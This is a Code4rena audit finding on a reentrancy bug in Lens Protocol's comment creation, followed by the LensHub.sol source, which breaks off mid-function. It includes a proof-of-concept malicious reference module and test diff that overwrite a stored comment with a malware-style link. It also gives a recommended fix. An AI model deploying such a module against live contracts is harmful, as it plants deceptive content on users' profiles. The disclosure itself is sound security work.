{
  "Title": "[M-13] Reentrancy allows commenter to overwrite own comments",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/LensHub.sol#L878-L888\n\n\n# Vulnerability details\n\nSince the Lens platform is a blockchain-based social media platform, it's important that information relevant to users be emitted so that light clients need not continually refer to the blockchain, which can be expensive. From the docs:\n```\nEvents are emitted at every state-changing function call, in addition to standard ERC721 events. Events often include the timestamp as a specific parameter, which allows for direct consumption using a bloom filter without needing to fetch block context on every event.\n```\nAs such, it is important that the content of emitted events matches what direct lookups of publication data shows.\n\n## Impact\nDue to the reentrancy bug outlined below, an attacker is able to emit a comment containing some information that does not match the actual information of a post, allowing him/her to trick light clients into responding to a post that they otherwise would have avoided. The attacker can use this to propagate scams, serve malware, or otherwise poison other user's profiles with unwanted content. Because there is no way to disable publications after the fact, these commenters' profiles now link to this bad content forever.\n\n## Proof of Concept\nAccording to the developers in the contest discord, the intention is for the whitelisting of modules to eventually be disabled altogether, or moved to be controlled by a DAO. The main purpose of the whitelist is to make sure that the modules written and used by everyone are built and scoped appropriately, not to limit calls to outside contracts (i.e. the module does what it does in the most efficient manner, using the method requiring the fewest outside contract calls). As such it's reasonable to assume that at some point in the future, an attacker will be able to find or write a ReferenceModule that enables him/her to trigger a function in a contract he/she owns (e.g. transfer an NFT, triggering an ERC721 pre-transfer approval check callback). Below is a version of this where, for simplicity's sake, the malicious code is directly in the module rather than being called by a callback somehow.\n```diff\ndiff --git a/MockReferenceModule.sol.original b/MockReferenceModule.sol\nindex 2552faf..0fe464b 100644\n--- a/MockReferenceModule.sol.original\n+++ b/MockReferenceModule.sol\n@@ -3,23 +3,46 @@\n pragma solidity 0.8.10;\n \n import {IReferenceModule} from '../interfaces/IReferenceModule.sol';\n-\n+import {ILensHub} from '../interfaces/ILensHub.sol';\n+import {DataTypes} from '../libraries/DataTypes.sol';\n contract MockReferenceModule is IReferenceModule {\n     function initializeReferenceModule(\n         uint256 profileId,\n         uint256 pubId,\n         bytes calldata data\n-    ) external pure override returns (bytes memory) {\n+    ) external override returns (bytes memory) {\n         uint256 number = abi.decode(data, (uint256));\n         require(number == 1, 'MockReferenceModule: invalid');\n+        l = msg.sender;\n         return new bytes(0);\n     }\n \n+    address l;\n+    bool a;\n     function processComment(\n         uint256 profileId,\n         uint256 profileIdPointed,\n         uint256 pubIdPointed\n-    ) external override {}\n+    ) external override {\n+        if (a) return;\n+        a = true;\n+        bytes memory garbage;\n+        string memory handle = \"attack.eth\";\n+        uint256 pid = ILensHub(l).getProfileIdByHandle(handle);\n+        ILensHub(l).comment(\n+            DataTypes.CommentData(\n+                profileId,\n+                // make their comment and thus their profile link\n+                // to our malicious payload\n+                \"https://yourCommentIsNowOnALinkToMalware.com/forever\",\n+                profileIdPointed,\n+                pubIdPointed,\n+                ILensHub(l).getCollectModule(profileIdPointed, pubIdPointed),\n+                garbage,\n+                address(0x0),\n+                garbage\n+        ));\n+    }\n \n     function processMirror(\n         uint256 profileId,\n```\n\nAs for triggering the actual attack, the attacker first acquires a profile with a lot of followers either by organically growing a following, stealing a profile's NFT, or buying access to one. Next, the attacker publishes interesting content with the malicious ReferenceModule, and finally, the attacker publishes an extremely engaging/viral comment to that publication, which will cause lots of other people to respond to it. The comment will emit an event that contains the original comment information, but the module will be able to overwrite the actual published comment on the blockchain with the attacker's alternate content due to a reentrancy bug where the `pubCount` can be overwritten:\n```solidity\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n```\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/LensHub.sol#L878-L888\n\nThe following test uses this altered module and shows that the attacker can emit a different comment than is actually stored by/used for subsequent comments:\n```diff\ndiff --git a/publishing-comments.spec.ts.original b/publishing-comments.spec.ts\nindex 471ba68..32dfb3a 100644\n--- a/publishing-comments.spec.ts.original\n+++ b/publishing-comments.spec.ts\n@@ -3,6 +3,11 @@ import { expect } from 'chai';\n import { MAX_UINT256, ZERO_ADDRESS } from '../../helpers/constants';\n import { ERRORS } from '../../helpers/errors';\n import { cancelWithPermitForAll, getCommentWithSigParts } from '../../helpers/utils';\n+import {\n+  getTimestamp,\n+  matchEvent,\n+  waitForTx,\n+} from '../../helpers/utils';\n import {\n   abiCoder,\n   emptyCollectModule,\n@@ -59,7 +64,7 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         })\n       ).to.not.be.reverted;\n     });\n-\n+/**\n     context('Negatives', function () {\n       it('UserTwo should fail to publish a comment to a profile owned by User', async function () {\n         await expect(\n@@ -151,8 +156,9 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         ).to.be.revertedWith(ERRORS.PUBLICATION_DOES_NOT_EXIST);\n       });\n     });\n-\n+/**/\n     context('Scenarios', function () {\n+/**\n       it('User should create a comment with empty collect module data, reference module, and reference module data, fetched comment data should be accurate', async function () {\n         await expect(\n           lensHub.comment({\n@@ -175,8 +181,23 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.collectNFT).to.eq(ZERO_ADDRESS);\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n-\n+/**/\n       it('User should create a post using the mock reference module as reference module, then comment on that post', async function () {\n+\n+        // user acquires account and sets up the attacking profile\n+        await expect(\n+          lensHub.createProfile({\n+            to: mockReferenceModule.address,\n+            handle: \"attack.eth\",\n+            imageURI: MOCK_PROFILE_URI,\n+            followModule: ZERO_ADDRESS,\n+            followModuleData: [],\n+            followNFTURI: MOCK_FOLLOW_NFT_URI,\n+          })\n+        ).to.not.be.reverted;\n+        await lensHub.setDispatcher(FIRST_PROFILE_ID, mockReferenceModule.address);\n+\n+        // create a post\n         const data = abiCoder.encode(['uint256'], ['1']);\n         await expect(\n           lensHub.post({\n@@ -189,22 +210,43 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n           })\n         ).to.not.be.reverted;\n \n-        await expect(\n+        // create extremely interesting bait comment\n+        const BAIT_COMMENT = \"https://somethingExtremelyInteresting.com/toGetEngagement\";\n+        let receipt = await waitForTx(\n           lensHub.comment({\n             profileId: FIRST_PROFILE_ID,\n-            contentURI: MOCK_URI,\n+            contentURI: BAIT_COMMENT,\n             collectModule: emptyCollectModule.address,\n             collectModuleData: [],\n             profileIdPointed: FIRST_PROFILE_ID,\n             pubIdPointed: 2,\n             referenceModule: ZERO_ADDRESS,\n             referenceModuleData: [],\n-          })\n-        ).to.not.be.reverted;\n+          },{gasLimit:12450000})\n+        );\n+\n+        // see the bait in the emitted event...\n+        matchEvent(receipt, 'CommentCreated', [\n+          FIRST_PROFILE_ID,\n+          3, // pubId 3 for profile 1\n+          BAIT_COMMENT, // <-- correct bait in the event\n+          FIRST_PROFILE_ID,\n+          2,\n+          emptyCollectModule.address,\n+          [],\n+          ZERO_ADDRESS,\n+          [],\n+          await getTimestamp(),\n+        ]);\n+\n+        // ...but malware when read, commented, or referenced\n+        let pub = await lensHub.getPub(FIRST_PROFILE_ID, 3);\n+        await expect(pub.contentURI)\n+          .to.equal(BAIT_COMMENT);\n       });\n     });\n   });\n-\n+/**\n   context('Meta-tx', function () {\n     beforeEach(async function () {\n       await expect(\n@@ -567,5 +609,5 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n     });\n-  });\n+  });/**/\n });\n```\n\nAfter applying the above changes, running `npm test test/hub/interactions/publishing-comments.spec.ts` yields:\n```diff\n\n  Publishing Comments\n    Generic\n      Scenarios\n        1) User should create a post using the mock reference module as reference module, then comment on that post\n\n\n  0 passing (19s)\n  1 failing\n\n  1) Publishing Comments\n       Generic\n         Scenarios\n           User should create a post using the mock reference module as reference module, then comment on that post:\n\n      AssertionError: expected 'https://yourCommentIsNowOnALinkToMalware.com/forever' to equal 'https://somethingExtremelyInteresting.com/toGetEngagement'\n      + expected - actual\n\n      -https://yourCommentIsNowOnALinkToMalware.com/forever\n      +https://somethingExtremelyInteresting.com/toGetEngagement\n      \n      at Context.<anonymous> (test/hub/interactions/publishing-comments.spec.ts:245:15)\n      at processTicksAndRejections (internal/process/task_queues.js:97:5)\n      at runNextTicks (internal/process/task_queues.js:66:3)\n      at listOnTimeout (internal/timers.js:523:9)\n      at processTimers (internal/timers.js:497:7)\n\n```\n\nAnyone that has commented on the engaging comment now has unwittingly commented on a malicious URI, potentially encouraging others to visit the URI. \n\n## Tools Used\nCode inspection\nHardhat\n\n## Recommended Mitigation Steps\nStore the new `pubCount` in a variable before the comment is created and use it during the creation rather than choosing it afterwards.\n\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-02-aave-lens-contest",
  "Code": [
    {
      "filename": "contracts/core/LensHub.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {Helpers} from '../libraries/Helpers.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {PublishingLogic} from '../libraries/PublishingLogic.sol';\nimport {InteractionLogic} from '../libraries/InteractionLogic.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {LensMultiState} from './base/LensMultiState.sol';\nimport {LensHubStorage} from './storage/LensHubStorage.sol';\nimport {VersionedInitializable} from '../upgradeability/VersionedInitializable.sol';\n\n/**\n * @title LensHub\n * @author Lens Protocol\n *\n * @notice This is the main entrypoint of the Lens Protocol. It contains governance functionality as well as\n * publishing and profile interaction functionality.\n *\n * NOTE: The Lens Protocol is unique in that frontend operators need to track a potentially overwhelming\n * number of NFT contracts and interactions at once. For that reason, we've made two quirky design decisions:\n *      1. Both Follow & Collect NFTs invoke an LensHub callback on transfer with the sole purpose of emitting an event.\n *      2. Almost every event in the protocol emits the current block timestamp, reducing the need to fetch it manually.\n */\ncontract LensHub is ILensHub, LensNFTBase, VersionedInitializable, LensMultiState, LensHubStorage {\n    uint256 internal constant REVISION = 1;\n\n    address internal immutable FOLLOW_NFT_IMPL;\n    address internal immutable COLLECT_NFT_IMPL;\n\n    /**\n     * @dev This modifier reverts if the caller is not the configured governance address.\n     */\n    modifier onlyGov() {\n        _validateCallerIsGovernance();\n        _;\n    }\n\n    /**\n     * @dev This modifier reverts if the caller is not a whitelisted profile creator address.\n     */\n    modifier onlyWhitelistedProfileCreator() {\n        _validateCallerIsWhitelistedProfileCreator();\n        _;\n    }\n\n    /**\n     * @dev The constructor sets the immutable follow & collect NFT implementations.\n     *\n     * @param followNFTImpl The follow NFT implementation address.\n     * @param collectNFTImpl The collect NFT implementation address.\n     */\n    constructor(address followNFTImpl, address collectNFTImpl) {\n        FOLLOW_NFT_IMPL = followNFTImpl;\n        COLLECT_NFT_IMPL = collectNFTImpl;\n    }\n\n    /// @inheritdoc ILensHub\n    function initialize(\n        string calldata name,\n        string calldata symbol,\n        address newGovernance\n    ) external override initializer {\n        super._initialize(name, symbol);\n        _setState(DataTypes.ProtocolState.Paused);\n        _setGovernance(newGovernance);\n    }\n\n    /// ***********************\n    /// *****GOV FUNCTIONS*****\n    /// ***********************\n\n    /// @inheritdoc ILensHub\n    function setGovernance(address newGovernance) external override onlyGov {\n        _setGovernance(newGovernance);\n    }\n\n    /// @inheritdoc ILensHub\n    function setEmergencyAdmin(address newEmergencyAdmin) external override onlyGov {\n        address prevEmergencyAdmin = _emergencyAdmin;\n        _emergencyAdmin = newEmergencyAdmin;\n        emit Events.EmergencyAdminSet(\n            msg.sender,\n            prevEmergencyAdmin,\n            newEmergencyAdmin,\n            block.timestamp\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setState(DataTypes.ProtocolState newState) external override {\n        if (msg.sender != _governance && msg.sender != _emergencyAdmin)\n            revert Errors.NotGovernanceOrEmergencyAdmin();\n        _setState(newState);\n    }\n\n    ///@inheritdoc ILensHub\n    function whitelistProfileCreator(address profileCreator, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _profileCreatorWhitelisted[profileCreator] = whitelist;\n        emit Events.ProfileCreatorWhitelisted(profileCreator, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistFollowModule(address followModule, bool whitelist) external override onlyGov {\n        _followModuleWhitelisted[followModule] = whitelist;\n        emit Events.FollowModuleWhitelisted(followModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistReferenceModule(address referenceModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _referenceModuleWhitelisted[referenceModule] = whitelist;\n        emit Events.ReferenceModuleWhitelisted(referenceModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistCollectModule(address collectModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _collectModuleWhitelisted[collectModule] = whitelist;\n        emit Events.CollectModuleWhitelisted(collectModule, whitelist, block.timestamp);\n    }\n\n    /// *********************************\n    /// *****PROFILE OWNER FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function createProfile(DataTypes.CreateProfileData calldata vars)\n        external\n        override\n        whenNotPaused\n        onlyWhitelistedProfileCreator\n    {\n        uint256 profileId = ++_profileCounter;\n        _mint(vars.to, profileId);\n        PublishingLogic.createProfile(\n            vars,\n            profileId,\n            _profileIdByHandleHash,\n            _profileById,\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModule(\n        uint256 profileId,\n        address followModule,\n        bytes calldata followModuleData\n    ) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        PublishingLogic.setFollowModule(\n            profileId,\n            followModule,\n            followModuleData,\n            _profileById[profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModuleWithSig(DataTypes.SetFollowModuleWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_MODULE_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.followModule,\n                            keccak256(vars.followModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        PublishingLogic.setFollowModule(\n            vars.profileId,\n            vars.followModule,\n            vars.followModuleData,\n            _profileById[vars.profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcher(uint256 profileId, address dispatcher) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        _setDispatcher(profileId, dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcherWithSig(DataTypes.SetDispatcherWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_DISPATCHER_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.dispatcher,\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setDispatcher(vars.profileId, vars.dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURI(uint256 profileId, string calldata imageURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setProfileImageURI(profileId, imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURIWithSig(DataTypes.SetProfileImageURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_PROFILE_IMAGE_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.imageURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setProfileImageURI(vars.profileId, vars.imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURI(uint256 profileId, string calldata followNFTURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setFollowNFTURI(profileId, followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_NFT_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.followNFTURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setFollowNFTURI(vars.profileId, vars.followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function postWithSig(DataTypes.PostWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            POST_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function comment(DataTypes.CommentData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createComment(vars);\n    }\n\n    /// @inheritdoc ILensHub\n    function commentWithSig(DataTypes.CommentWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COMMENT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createComment(\n            DataTypes.CommentData(\n                vars.profileId,\n                vars.contentURI,\n                vars.profileIdPointed,\n                vars.pubIdPointed,\n                vars.collectModule,\n                vars.collectModuleData,\n                vars.referenceModule,\n                vars.referenceModuleData\n            )\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirror(DataTypes.MirrorData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirrorWithSig(DataTypes.MirrorWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            MIRROR_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /**\n     * @notice Burns a profile, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burn()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burn(uint256 tokenId) public override whenNotPaused {\n        super.burn(tokenId);\n        _clearHandleHash(tokenId);\n    }\n\n    /**\n     * @notice Burns a profile with a signature, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burnWithSig()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig)\n        public\n        override\n        whenNotPaused\n    {\n        super.burnWithSig(tokenId, sig);\n        _clearHandleHash(tokenId);\n    }\n\n    /// ***************************************\n    /// *****PROFILE INTERACTION FUNCTIONS*****\n    /// ***************************************\n\n    /// @inheritdoc ILensHub\n    function follow(uint256[] calldata profileIds, bytes[] calldata datas)\n        external\n        override\n        whenNotPaused\n    {\n        InteractionLogic.follow(\n            msg.sender,\n            profileIds,\n            datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function followWithSig(DataTypes.FollowWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32[] memory dataHashes = new bytes32[](vars.datas.length);\n        for (uint256 i = 0; i < vars.datas.length; ++i) {\n            dataHashes[i] = keccak256(vars.datas[i]);\n        }\n\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            FOLLOW_WITH_SIG_TYPEHASH,\n                            keccak256(abi.encodePacked(vars.profileIds)),\n                            keccak256(abi.encodePacked(dataHashes)),\n                            sigNonces[vars.follower]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.follower, vars.sig);\n        InteractionLogic.follow(\n            vars.follower,\n            vars.profileIds,\n            vars.datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collect(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external override whenNotPaused {\n        InteractionLogic.collect(\n            msg.sender,\n            profileId,\n            pubId,\n            data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collectWithSig(DataTypes.CollectWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COLLECT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.pubId,\n                            keccak256(vars.data),\n                            sigNonces[vars.collector]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.collector, vars.sig);\n        InteractionLogic.collect(\n            vars.collector,\n            vars.profileId,\n            vars.pubId,\n            vars.data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function emitFollowNFTTransferEvent(\n        uint256 profileId,\n        uint256 followNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedFollowNFT = _profileById[profileId].followNFT;\n        if (msg.sender != expectedFollowNFT) revert Errors.CallerNotFollowNFT();\n        emit Events.FollowNFTTransferred(profileId, followNFTId, from, to, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function emitCollectNFTTransferEvent(\n        uint256 profileId,\n        uint256 pubId,\n        uint256 collectNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedCollectNFT = _pubByIdByProfile[profileId][pubId].collectNFT;\n        if (msg.sender != expectedCollectNFT) revert Errors.CallerNotCollectNFT();\n        emit Events.CollectNFTTransferred(\n            profileId,\n            pubId,\n            collectNFTId,\n            from,\n            to,\n            block.timestamp\n        );\n    }\n\n    /// *********************************\n    /// *****EXTERNAL VIEW FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function isProfileCreatorWhitelisted(address profileCreator)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _profileCreatorWhitelisted[profileCreator];\n    }\n\n    /// @inheritdoc ILensHub\n    function isFollowModuleWhitelisted(address followModule) external view override returns (bool) {\n        return _followModuleWhitelisted[followModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isReferenceModuleWhitelisted(address referenceModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _referenceModuleWhitelisted[referenceModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isCollectModuleWhitelisted(address collectModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _collectModuleWhitelisted[collectModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function getGovernance() external view override returns (address) {\n        return _governance;\n    }\n\n    /// @inheritdoc ILensHub\n    function getDispatcher(uint256 profileId) external view override returns (address) {\n        return _dispatcherByProfile[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubCount(uint256 profileId) external view override returns (uint256) {\n        return _profileById[profileId].pubCount;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFT(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFTURI(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].followNFTURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectNFT(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowModule(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getReferenceModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].referenceModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getHandle(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].handle;\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubPointer(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (uint256, uint256)\n    {\n        uint256 profileIdPointed = _pubByIdByProfile[profileId][pubId].profileIdPointed;\n        uint256 pubIdPointed = _pubByIdByProfile[profileId][pubId].pubIdPointed;\n        return (profileIdPointed, pubIdPointed);\n    }\n\n    /// @inheritdoc ILensHub\n    function getContentURI(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (string memory)\n    {\n        (uint256 rootProfileId, uint256 rootPubId, ) = Helpers.getPointedIfMirror(\n            profileId,\n            pubId,\n            _pubByIdByProfile\n        );\n        return _pubByIdByProfile[rootProfileId][rootPubId].contentURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {\n        bytes32 handleHash = keccak256(bytes(handle));\n        return _profileIdByHandleHash[handleHash];\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfile(uint256 profileId)\n        external\n        view\n        override\n        returns (DataTypes.ProfileStruct memory)\n    {\n        return _profileById[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPub(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PublicationStruct memory)\n    {\n        return _pubByIdByProfile[profileId][pubId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubType(uint256 profileId, uint256 pubId)\n        external\n        view\n        